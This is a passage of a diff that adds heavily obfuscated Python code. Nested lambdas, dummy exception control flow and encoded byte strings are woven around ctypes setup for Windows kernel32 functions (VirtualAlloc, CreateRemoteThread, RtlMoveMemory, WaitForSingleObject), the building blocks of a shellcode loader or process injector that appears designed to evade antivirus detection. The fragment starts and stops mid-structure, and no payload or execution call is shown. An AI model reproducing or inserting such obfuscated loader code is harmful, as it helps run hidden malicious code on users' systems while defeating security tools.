+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742704, 16742703]))))())())()])
+        raise MemoryError([(lambda: (lambda _1410: _1410 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _73:
+        __2403045619373 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
+try:
+    match '121' == '916':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _318 = [[True], [False]]
+            R_E_D__A_V______(['_175'])
+    raise MemoryError([True])
+except MemoryError as _102:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742703]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _1613: _1613 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _19 = [[(lambda: (lambda _106: _106 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1713: _1713 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742706]))))())())()])
+        raise MemoryError([(lambda: (lambda _1716: _1716 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _1418:
+        try:
+            raise MemoryError(__2403045619373)
+        except MemoryError as __6938645548017:
+            if __6938645548017.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
+                kernel32.VirtualAlloc.restype = wt.LPVOID
+            if __6938645548017.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
+                __7374402725785 = (lambda: R_E_D__A_V(b'R_E_D__A_V__c\xcc\xa91A\x9a'))()
+try:
+    match '124' == '710':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _64 = [[True], [False]]
+            R_E_D__A_V______(['_513'])
+    raise MemoryError([True])
+except MemoryError as _78:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742708]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _117: _117 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _1419 = [[(lambda: (lambda _618: _618 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _155: _155 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742704, 16742704]))))())())()])
+        raise MemoryError([(lambda: (lambda _1118: _1118 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _95:
+        __4827490900242 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
+try:
+    match '159' == '175':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _82 = [[True], [False]]
+            R_E_D__A_V______(['_1615'])
+    raise MemoryError([True])
+except MemoryError as _148:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742708, 16742704, 16742709]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742706]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _918: _918 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _36 = [[(lambda: (lambda _614: _614 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _27: _27 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707]))))())())()])
+        raise MemoryError([(lambda: (lambda _42: _42 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _516:
+        __4827490900242 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
+try:
+    match '212' == '1812':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _819 = [[True], [False]]
+            R_E_D__A_V______(['_1311'])
+    raise MemoryError([True])
+except MemoryError as _188:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742704, 16742703]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704, 16742707]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _417: _417 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _191 = [[(lambda: (lambda _162: _162 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _818: _818 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742709, 16742708]))))())())()])
+        raise MemoryError([(lambda: (lambda _183: _183 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _106:
+        try:
+            raise MemoryError(__4827490900242)
+        except MemoryError as __6593111875505:
+            if __6593111875505.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
+                kernel32.CreateRemoteThread.argtypes = (wt.HANDLE, wt.LPVOID, ctypes.c_size_t, wt.LPVOID, wt.LPVOID, wt.DWORD, wt.LPVOID)
+            if __6593111875505.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
+                __5174664772492 = (lambda: R_E_D__A_V(b'R_E_D__A_V__y\xad\xef~\xa5\xa0'))()
+try:
+    match '814' == '511':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _417 = [[True], [False]]
+            R_E_D__A_V______(['_12'])
+    raise MemoryError([True])
+except MemoryError as _1317:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742705]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _74: _74 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _146 = [[(lambda: (lambda _1811: _1811 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _117: _117 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742709]))))())())()])
+        raise MemoryError([(lambda: (lambda _144: _144 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _1419:
+        __4016863541421 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
+try:
+    match '81' == '314':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _135 = [[True], [False]]
+            R_E_D__A_V______(['_1618'])
+    raise MemoryError([True])
+except MemoryError as _87:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742704, 16742705]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742710, 16742704, 16742712]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _115: _115 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _34 = [[(lambda: (lambda _195: _195 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _217: _217 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742706, 16742708]))))())())()])
+        raise MemoryError([(lambda: (lambda _79: _79 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _29:
+        __4016863541421 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
+try:
+    match '21' == '122':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _14 = [[True], [False]]
+            R_E_D__A_V______(['_1215'])
+    raise MemoryError([True])
+except MemoryError as _315:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712, 16742704, 16742711]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _121: _121 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _26 = [[(lambda: (lambda _57: _57 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _78: _78 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742706, 16742704, 16742712]))))())())()])
+        raise MemoryError([(lambda: (lambda _157: _157 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _212:
+        try:
+            raise MemoryError(__4016863541421)
+        except MemoryError as __7374226100282:
+            if __7374226100282.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
+                kernel32.CreateRemoteThread.restype = wt.HANDLE
+            if __7374226100282.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
+                __5870400038454 = (lambda: R_E_D__A_V(b'R_E_D__A_V__H\xf7\xe4\xe0N\xf0'))()
+            if __7374226100282.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
+                __6768840885029 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xf8\xb1\xcag<\xc6'))()
+            if __7374226100282.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
+                __5982610534938 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xe6\xb4\xe0\x18\xc3\xab'))()
+            if __7374226100282.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
+                __3239556079972 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xedA\xa7\xa7\r;'))()
+            if __7374226100282.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x07'))():
+                __2244130908604 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x83\x98gv\x9e,'))()
+try:
+    match '510' == '919':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _216 = [[True], [False]]
+            R_E_D__A_V______(['_58'])
+    raise MemoryError([True])
+except MemoryError as _118:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742705, 16742704, 16742711]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _34: _34 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _56 = [[(lambda: (lambda _168: _168 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1013: _1013 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742709, 16742708]))))())())()])
+        raise MemoryError([(lambda: (lambda _64: _64 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _810:
+        __2665585129355 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
+try:
+    match '114' == '47':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _314 = [[True], [False]]
+            R_E_D__A_V______(['_73'])
+    raise MemoryError([True])
+except MemoryError as _149:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742708, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742705, 16742707]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _1410: _1410 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _1014 = [[(lambda: (lambda _1917: _1917 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _172: _172 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742711]))))())())()])
+        raise MemoryError([(lambda: (lambda _1812: _1812 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _124:
+        __2665585129355 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
+try:
+    match '12' == '710':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _57 = [[True], [False]]
+            R_E_D__A_V______(['_1815'])
+    raise MemoryError([True])
+except MemoryError as _1114:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742704]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742706]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _1817: _1817 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _1918 = [[(lambda: (lambda _1611: _1611 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _174: _174 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707]))))())())()])
+        raise MemoryError([(lambda: (lambda _713: _713 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _1519:
+        try:
+            raise MemoryError(__2665585129355)
+        except MemoryError as __4663480633126:
+            if __4663480633126.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
+                kernel32.RtlMoveMemory.argtypes = (wt.LPVOID, wt.LPVOID, ctypes.c_size_t)
+            if __4663480633126.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
+                __6120455130869 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xb9\xe44Z\xed\x1a'))()
+            if __4663480633126.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
+                __4800723408826 = (lambda: R_E_D__A_V(b'R_E_D__A_V__&C\xbdsl9'))()
+            if __4663480633126.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
+                __3237262108744 = (lambda: R_E_D__A_V(b'R_E_D__A_V__?\xeb^G\x16\xc6'))()
+try:
+    match '715' == '122':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _89 = [[True], [False]]
+            R_E_D__A_V______(['_416'])
+    raise MemoryError([True])
+except MemoryError as _818:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704, 16742708]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742709]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _13: _13 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _116 = [[(lambda: (lambda _125: _125 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1813: _1813 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742710, 16742707]))))())())()])
+        raise MemoryError([(lambda: (lambda _1814: _1814 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _1410:
+        __2855414600172 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
+try:
+    match '919' == '1916':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _1118 = [[True], [False]]
+            R_E_D__A_V______(['_147'])
+    raise MemoryError([True])
+except MemoryError as _154:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742704, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742706, 16742704, 16742707]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _197: _197 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _1118 = [[(lambda: (lambda _1918: _1918 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1716: _1716 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742708, 16742704, 16742712]))))())())()])
+        raise MemoryError([(lambda: (lambda _316: _316 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _136:
+        __2855414600172 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
+try:
+    match '116' == '191':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _36 = [[True], [False]]
+            R_E_D__A_V______(['_712'])
+    raise MemoryError([True])
+except MemoryError as _152:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742710, 16742709]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742711]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _161: _161 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _171 = [[(lambda: (lambda _1815: _1815 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _1115: _1115 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742707, 16742704, 16742712]))))())())()])
+        raise MemoryError([(lambda: (lambda _76: _76 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _617:
+        try:
+            raise MemoryError(__2855414600172)
+        except MemoryError as __2352956070683:
+            if __2352956070683.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
+                kernel32.RtlMoveMemory.restype = None
+            if __2352956070683.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
+                __5341806202542 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xa9\xbd\xe0\xbdu\x8e'))()
+            if __2352956070683.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
+                __4164277909701 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xd0\xdb\xe7\x19\x18Y'))()
+            if __2352956070683.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
+                __3871151010188 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\xd3\xa9.\xa5\xf5U'))()
+try:
+    match '917' == '815':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _29 = [[True], [False]]
+            R_E_D__A_V______(['_127'])
+    raise MemoryError([True])
+except MemoryError as _91:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742704, 16742704, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742706, 16742706]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _169: _169 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _1312 = [[(lambda: (lambda _1613: _1613 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _89: _89 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742707, 16742704, 16742709]))))())())()])
+        raise MemoryError([(lambda: (lambda _108: _108 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _43:
+        __7954502807460 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
+try:
+    match '141' == '183':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _41 = [[True], [False]]
+            R_E_D__A_V______(['_618'])
+    raise MemoryError([True])
+except MemoryError as _94:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742703]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742712]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _186: _186 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _1712 = [[(lambda: (lambda _52: _52 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _43: _43 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742705, 16742712]))))())())()])
+        raise MemoryError([(lambda: (lambda _84: _84 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _712:
+        __7954502807460 += (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))()
+try:
+    match '813' == '166':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _1416 = [[True], [False]]
+            R_E_D__A_V______(['_73'])
+    raise MemoryError([True])
+except MemoryError as _105:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742711]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742707, 16742704, 16742705]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _121: _121 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _196 = [[(lambda: (lambda _46: _46 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _145: _145 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742712]))))())())()])
+        raise MemoryError([(lambda: (lambda _1016: _1016 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _16:
+        try:
+            raise MemoryError(__7954502807460)
+        except MemoryError as __7699025200479:
+            if __7699025200479.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x01'))():
+                kernel32.WaitForSingleObject.argtypes = (wt.HANDLE, wt.DWORD)
+            if __7699025200479.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x03'))():
+                __2602757020010 = (lambda: R_E_D__A_V(b'R_E_D__A_V__YFz\x013\x13'))()
+            if __7699025200479.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x04'))():
+                __8401171789736 = (lambda: R_E_D__A_V(b'R_E_D__A_V__ F\x9b57\x17'))()
+            if __7699025200479.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05'))():
+                __6703314380286 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x05\x18U_\xf4/'))()
+            if __7699025200479.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x06'))():
+                __3808106641960 = (lambda: R_E_D__A_V(b'R_E_D__A_V__#H\xfb\xd6\x84\xc4'))()
+            if __7699025200479.args[(lambda: R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda: R_E_D__A_V(b'R_E_D__A_V__\x07'))():
+                __5754475309275 = (lambda: R_E_D__A_V(b'R_E_D__A_V__\x0e\x11\xd7kZ\xc7'))()
+try:
+    match '36' == '1218':
+        case True:
+            raise MemoryError([True])
+        case False:
+            _192 = [[True], [False]]
+            R_E_D__A_V______(['_94'])
+    raise MemoryError([True])
+except MemoryError as _73:
+    try:
+        match (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742711, 16742704, 16742707]))))())())() == (lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742709, 16742704, 16742711]))))())())():
+            case True:
+                raise MemoryError([(lambda: (lambda _1310: _1310 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+            case False:
+                _172 = [[(lambda: (lambda _610: _610 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda: (lambda _215: _215 - (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()]]
+                R_E_D__A_V______([(lambda: (lambda: (lambda: R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742708, 16742708]))))())())()])
+        raise MemoryError([(lambda: (lambda _1913: _1913 + (lambda: ______R_E_D__A_V_______(30584))())(0) == 1)()])
+    except MemoryError as _1210:
+        __6265874322424 = (lambda: R_E_D__A_V(b'R_E_D__A_V__'))()
+try:
+    match '510' == '167':
+        case True:
+            raise MemoryError([True])
+        case False:
